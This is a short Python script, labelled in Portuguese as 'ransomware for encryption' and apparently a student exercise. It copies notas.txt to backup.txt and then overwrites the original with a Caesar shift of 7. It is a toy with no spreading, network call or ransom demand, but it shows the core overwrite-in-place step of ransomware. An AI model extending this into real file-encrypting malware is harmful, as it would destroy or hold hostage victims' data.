#   Ransomware para criptografia
#   
#   Desenvolvido por Pedro Figueira, Jean Alves, Vinicius Bonicio, Kathellin Ribeiro

f = open("notas.txt", "r")

texto = f.read()
f.close()

g = open("backup.txt", "w")
g.write(texto)
g.close()

criptografado = ""

for caracter in texto:
    criptografado = criptografado + chr(ord(caracter) + 7)

f = open("notas.txt", "w")
f.write(criptografado)
f.close()

print("")